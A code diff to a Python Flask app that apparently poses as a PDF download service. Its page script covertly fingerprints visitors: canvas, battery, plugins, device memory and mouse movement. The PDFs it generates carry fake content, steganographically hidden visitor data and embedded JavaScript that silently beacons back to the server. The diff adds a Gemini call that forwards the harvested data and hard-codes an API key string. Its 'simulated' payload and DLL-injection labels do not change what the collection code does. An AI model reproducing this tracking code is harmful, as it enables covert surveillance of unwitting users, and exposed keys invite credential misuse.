@@ -16,6 +16,11 @@ from stegano import lsb
 from PIL import Image as PILImage
 import PyPDF2
 
+# Import the Google Generative AI SDK for Gemini
+import google.generativeai as genai
+# Configure the SDK with your Gemini API key.
+genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
+
 app = Flask(__name__)
 
 # Configure logging to a file
@@ -28,7 +33,7 @@ logging.basicConfig(
 # Initialize Faker for generating fake PDF content
 fake = Faker()
 
-# Encryption key (in production, store securely, e.g., environment variable)
+# Encryption key (store securely in production)
 ENCRYPTION_KEY = Fernet.generate_key()
 CIPHER = Fernet(ENCRYPTION_KEY)
 
@@ -107,7 +112,7 @@ def collect_data(req):
 def embed_data_in_image(data):
     """Embed encrypted data in an image using steganography."""
     encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
-    # Create a larger base image (500x500) for more capacity.
+    # Create a base image (500x500) for more capacity.
     base_img = PILImage.new('RGB', (500, 500), color='white')
     temp_path = 'temp_base.png'
     base_img.save(temp_path)
@@ -119,7 +124,6 @@ def simulate_multi_stage_payload(data):
     """Simulate multi-stage payload delivery (for demonstration only)."""
     logging.info("Simulating multi-stage payload delivery with data: " + json.dumps(data))
     stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
-    # Simulate a secondary stage
     stage_payload["stage"] = "secondary"
     stage_payload["info"] = "Additional stage executed"
     logging.info("Simulated multi-stage payload: " + json.dumps(stage_payload))
@@ -130,10 +134,84 @@ def simulate_dll_injection():
     logging.info("Simulated DLL injection executed (defensive demonstration only)")
     return "DLL injection simulated"
 
+def get_gemini_report(data):
+    """
+    Use the Google Generative AI SDK to generate a security and forensics report.
+    The prompt instructs Gemini to act as a Security and Forensics Analyst.
+    """
+    try:
+        prompt = (      You are a highly skilled Security and Forensics Analyst. Your task is to analyze the following data and provide a comprehensive security report.
+    The data represents system logs, network traffic, or other security-related information.
+
+    **Instructions:**
+
+    1.  **Identify Security Threats:**  Analyze the data to identify potential security threats, vulnerabilities, or anomalies.  This includes, but is not limited to:
+        *   Malware infections
+        *   Unauthorized access attempts
+        *   Data exfiltration
+        *   Suspicious network activity
+        *   Vulnerabilities in software or configurations
+        *   Policy violations
+        *   Compliance issues
+
+    2.  **Assess Risk Level:**  For each identified threat, assess the risk level (High, Medium, Low) based on the potential impact and likelihood of occurrence.  Provide a justification for the risk level.
+
+    3.  **Provide Recommendations:**  For each identified threat, provide specific and actionable recommendations to mitigate the risk.  These recommendations should include steps to:
+        *   Contain the threat
+        *   Eradicate the threat
+        *   Prevent future occurrences
+
+    4.  **Explain Your Reasoning:**  Clearly explain your reasoning for each conclusion.  Cite specific evidence from the data to support your analysis.
+
+    5.  **Format the Report:**  Structure the report as follows:
+
+        **Security Analysis Report**
+
+        **Date:** [Current Date and Time]
+
+        **Data Source:** [Description of the data source]
+
+        **Executive Summary:** [A brief overview of the key findings and recommendations.]
+
+        **Detailed Findings:**
+
+        *   **Finding 1:** [Description of the threat]
+            *   **Risk Level:** [High/Medium/Low]
+            *   **Justification:** [Explanation of the risk level]
+            *   **Evidence:** [Specific data points supporting the finding]
+            *   **Recommendations:** [Specific steps to mitigate the risk]
+
+        *   **Finding 2:** [Repeat the above structure for each finding]
+
+        **Conclusion:** [A summary of the overall security posture and key takeaways.]
+
+        **Appendix:** [Raw data or other supporting information (optional)]
+
+    **Data to Analyze:**
+
+    ```
+    {data}
+    ```
+
+    **Important Considerations:**
+
+    *   Be thorough and comprehensive in your analysis.
+    *   Prioritize critical threats and vulnerabilities.
+    *   Provide clear and concise recommendations.
+    *   Maintain a professional and objective tone.
+    """  + json.dumps(data))
+        model = genai.GenerativeModel('gemini-2.0-flash')
+        response = model.generate_content(prompt)
+        report = response.text
+        logging.info("Gemini AI report received: " + report)
+        return report
+    except Exception as e:
+        logging.error("Error contacting Gemini AI: " + str(e))
+        return f"Error contacting Gemini AI: {e}"
+
 def generate_pdf(logged_data):
-    """Generate a PDF with fake content and embedded steganographic data.
-    Afterwards, add custom metadata and embedded JavaScript callbacks via PyPDF2."""
-    # Build PDF using Platypus
+    """Generate a PDF with fake content and embed steganographic data.
+    Add custom metadata and JavaScript callbacks via PyPDF2."""
     buffer = BytesIO()
     doc = SimpleDocTemplate(buffer, pagesize=letter)
     styles = getSampleStyleSheet()
@@ -154,7 +232,7 @@ def generate_pdf(logged_data):
     img_buffer.seek(0)
     story.append(Image(img_buffer, width=100, height=100))
 
-    # Verification link with unique token
+    # Verification link with a unique token
     token = str(uuid.uuid4())
     verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
     story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))
@@ -162,7 +240,7 @@ def generate_pdf(logged_data):
     doc.build(story)
     buffer.seek(0)
     
-    # Now add extra metadata and JavaScript via PyPDF2.
+    # Add extra metadata and JavaScript via PyPDF2.
     hidden_message = get_hidden_message(logged_data)
     reversed_token = token[::-1]
     
@@ -170,12 +248,9 @@ def generate_pdf(logged_data):
     pdf_writer = PyPDF2.PdfWriter()
     for page in pdf_reader.pages:
         pdf_writer.add_page(page)
-    # Add custom metadata containing the hidden message.
     pdf_writer.add_metadata({'/HiddenData': hidden_message})
     
-    # Embed JavaScript callbacks without alerting the user.
     js_code = f"""
-    // Primary callback: send hidden message to the server.
     if (typeof XMLHttpRequest !== 'undefined') {{
         try {{
             var req1 = new XMLHttpRequest();
@@ -183,7 +258,6 @@ def generate_pdf(logged_data):
             req1.send();
         }} catch(e) {{}}
     }}
-    // Secondary callback: send the reversed token (which is reversed back) to a second endpoint.
     var reversedToken = "{reversed_token}";
     var token = reversedToken.split("").reverse().join("");
     if (typeof XMLHttpRequest !== 'undefined') {{
@@ -208,22 +282,9 @@ HTML_PAGE = """
     <meta charset="UTF-8">
     <title>Download PDF</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 100px;
-            background-color: #f2f2f2;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f2f2f2; }
         h1 { color: #333; }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
+        button { padding: 15px 30px; font-size: 18px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
         button:hover { background-color: #45a049; }
     </style>
 </head>
@@ -261,18 +322,12 @@ HTML_PAGE = """
         document.getElementById('pageLoadTime').value = pageLoadTime;
         var lastMouseX = 0, lastMouseY = 0;
         document.addEventListener('mousemove', function(e) {
-            lastMouseX = e.clientX;
-            lastMouseY = e.clientY;
+            lastMouseX = e.clientX; lastMouseY = e.clientY;
         });
         function gatherExtraData(callback) {
-            var canvas = document.createElement("canvas");
-            var ctx = canvas.getContext("2d");
-            ctx.textBaseline = "top";
-            ctx.font = "14px Arial";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = "#069";
-            ctx.fillText("Hello, world!", 2, 15);
+            var canvas = document.createElement("canvas"), ctx = canvas.getContext("2d");
+            ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
+            ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Hello, world!", 2, 15);
             document.getElementById('canvasFingerprint').value = canvas.toDataURL();
             document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
             document.getElementById('deviceMemory').value = navigator.deviceMemory || '';
@@ -281,14 +336,10 @@ HTML_PAGE = """
             if (navigator.plugins) {
                 var plugins = Array.from(navigator.plugins).map(function(p) { return p.name; });
                 document.getElementById('plugins').value = plugins.join(', ');
-            } else {
-                document.getElementById('plugins').value = '';
-            }
+            } else { document.getElementById('plugins').value = ''; }
             if (navigator.connection && navigator.connection.downlink) {
                 document.getElementById('downlink').value = navigator.connection.downlink;
-            } else {
-                document.getElementById('downlink').value = '';
-            }
+            } else { document.getElementById('downlink').value = ''; }
             if (navigator.getBattery) {
                 navigator.getBattery().then(function(battery) {
                     document.getElementById('batteryLevel').value = battery.level;
@@ -299,11 +350,7 @@ HTML_PAGE = """
                     document.getElementById('charging').value = '';
                     callback();
                 });
-            } else {
-                document.getElementById('batteryLevel').value = '';
-                document.getElementById('charging').value = '';
-                callback();
-            }
+            } else { document.getElementById('batteryLevel').value = ''; document.getElementById('charging').value = ''; callback(); }
         }
         document.getElementById('downloadForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -313,20 +360,14 @@ HTML_PAGE = """
             document.getElementById('pixelDepth').value = screen.pixelDepth;
             document.getElementById('language').value = navigator.language;
             document.getElementById('platform').value = navigator.platform;
-            if (navigator.connection && navigator.connection.effectiveType) {
-                document.getElementById('connection').value = navigator.connection.effectiveType;
-            } else {
-                document.getElementById('connection').value = '';
-            }
+            document.getElementById('connection').value = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : '';
             document.getElementById('referrer').value = document.referrer;
             var clickTime = Date.now();
             document.getElementById('clickTime').value = clickTime;
             document.getElementById('dwellTime').value = clickTime - pageLoadTime;
             document.getElementById('lastMouseX').value = lastMouseX;
             document.getElementById('lastMouseY').value = lastMouseY;
-            gatherExtraData(function() {
-                e.target.submit();
-            });
+            gatherExtraData(function() { e.target.submit(); });
         });
     </script>
 </body>
@@ -341,6 +382,11 @@ def index():
 def download():
     logged_data = collect_data(request)
     logging.info(json.dumps(logged_data))
+    
+    # Use Gemini AI via Google Gen AI SDK to generate a report.
+    gemini_report = get_gemini_report(logged_data)
+    logged_data["gemini_report"] = gemini_report
+    logging.info("Gemini AI report: " + gemini_report)
     
     multi_stage_result = simulate_multi_stage_payload(logged_data)
     dll_injection_result = simulate_dll_injection()
@@ -404,6 +450,18 @@ def display_logs():
     </html>
     """
     return render_template_string(logs_html, logs=logs)
+
+@app.route('/gemini', methods=['GET'])
+def display_gemini_report():
+    """
+    Endpoint to display the Gemini AI report for a given token.
+    Access it via /gemini?token=YOUR_TOKEN
+    """
+    token = request.args.get('token')
+    if token in logged_tokens:
+        report = logged_tokens[token].get("gemini_report", "No report available")
+        return render_template_string("<h1>Gemini AI Report</h1><p>{{ report }}</p>", report=report)
+    return "Invalid token", 400
 
 @app.route('/simulate')
 def simulate():
